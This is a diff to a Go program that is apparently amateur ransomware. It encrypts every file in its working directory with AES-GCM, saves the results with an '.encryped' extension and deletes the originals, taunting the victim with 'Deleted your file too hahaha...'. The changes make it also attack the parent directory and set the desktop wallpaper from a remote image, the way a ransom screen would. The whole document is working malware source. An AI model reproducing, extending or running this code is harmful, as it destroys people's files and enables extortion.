@@ -4,11 +4,16 @@ import (
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/rand"
+	"path/filepath"
+
+	// "filepath"
 	"fmt"
 	"io"
 	"io/ioutil"
 	"log"
 	"os"
+
+	"github.com/reujab/wallpaper"
 )
 
 func ReadFile() {
@@ -35,15 +40,16 @@ func findImportantFiles(fileList []os.FileInfo, fileName string) int {
 func removeFiles(fileList []os.FileInfo) []os.FileInfo {
 	i := findImportantFiles(fileList, "main.exe")
 	if i == -1 {
-		log.Fatal("Error, file not found")
+		fmt.Println("Error, file not found")
+		return nil
 	}
 	fileList = remove(fileList, i)
 
-	i = findImportantFiles(fileList, "main.go")
-	if i == -1 {
-		log.Fatal("Error, file not found")
-	}
-	fileList = remove(fileList, i)
+	// i = findImportantFiles(fileList, "main.go")
+	// if i == -1 {
+	// 	log.Fatal("Error, file not found")
+	// }
+	// fileList = remove(fileList, i)
 
 	return fileList
 }
@@ -53,16 +59,16 @@ func remove(fileList []os.FileInfo, index int) []os.FileInfo {
 	return fileList[:len(fileList)-1]
 }
 
-func readFile(file os.FileInfo) []byte {
-	plaintext, err := ioutil.ReadFile(file.Name())
+func readFile(filename string) []byte {
+	plaintext, err := ioutil.ReadFile(filename)
 	if err != nil {
 		log.Fatal(err)
 	}
 	return plaintext
 }
 
-func deleteFile(file os.FileInfo) {
-	err := os.Remove(file.Name())
+func deleteFile(filename string) {
+	err := os.Remove(filename)
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -87,8 +93,9 @@ func init_GCM_AES() cipher.AEAD {
 	return gcm
 }
 
-func encryptFile(file os.FileInfo, gcmObject cipher.AEAD) bool {
-	plaintext := readFile(file)
+func encryptFile(file os.FileInfo, gcmObject cipher.AEAD, path string) bool {
+	filename := filepath.Join(path, file.Name())
+	plaintext := readFile(filename)
 	nonce := make([]byte, gcmObject.NonceSize())
 	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
 		log.Fatal(err)
@@ -96,13 +103,31 @@ func encryptFile(file os.FileInfo, gcmObject cipher.AEAD) bool {
 
 	ciphertext := gcmObject.Seal(nonce, nonce, plaintext, nil)
 
-	newEncFileName := file.Name() + ".encryped"
+	newEncFileName := filename + ".encryped"
 	err := ioutil.WriteFile(newEncFileName, ciphertext, 0777)
 
 	if err != nil {
 		log.Panic(err)
 	}
 	return true
+}
+
+func encryptFiles(files []os.FileInfo, gcmObject cipher.AEAD, path string) {
+	for _, f := range files { //Loop through all files in current directory
+		fmt.Println(f.Name())
+		if !f.IsDir() {
+			result := encryptFile(f, gcmObject, path)
+			if result {
+				fmt.Println("File encrypted... :)")
+				deleteFile(filepath.Join(path, f.Name()))
+				fmt.Println("Deleted your file too hahaha...")
+			}
+		}
+		// else {
+		// 	directoryFound := ReadDir(f.Name())
+		// 	encryptFiles(directoryFound, gcmObject, path)
+		// }
+	}
 }
 
 func main() {
@@ -114,21 +139,25 @@ func main() {
 
 	files := ReadDir(path) //Gets list of files in directory
 
-	files = removeFiles(files) //removes our important files
+	removedFiles := removeFiles(files) //removes our important files
+	if removedFiles != nil {
+		files = removedFiles
+	}
 
 	gcm := init_GCM_AES()
 
-	for _, f := range files { //Loop through all files in current directory
-		fmt.Println(f.Name())
-		if !f.IsDir() {
-			result := encryptFile(f, gcm)
-			if result {
-				fmt.Println("File encrypted... :)")
-				deleteFile(f)
-				fmt.Println("Deleted your file too hahaha...")
-			}
-		}
-	}
+	// encryptFiles(files, gcm)
+
+	err = wallpaper.SetFromURL("https://mcdn.wallpapersafari.com/medium/45/23/0GPJnt.png")
+	fmt.Println(err)
+
+	encryptFiles(files, gcm, path)
+
+	parentPath := filepath.Dir(path)
+
+	files = ReadDir(parentPath)
+
+	encryptFiles(files, gcm, parentPath)
 
 	//Now crypto...
 	//Using AES, choose a mode and find easy implementation online please
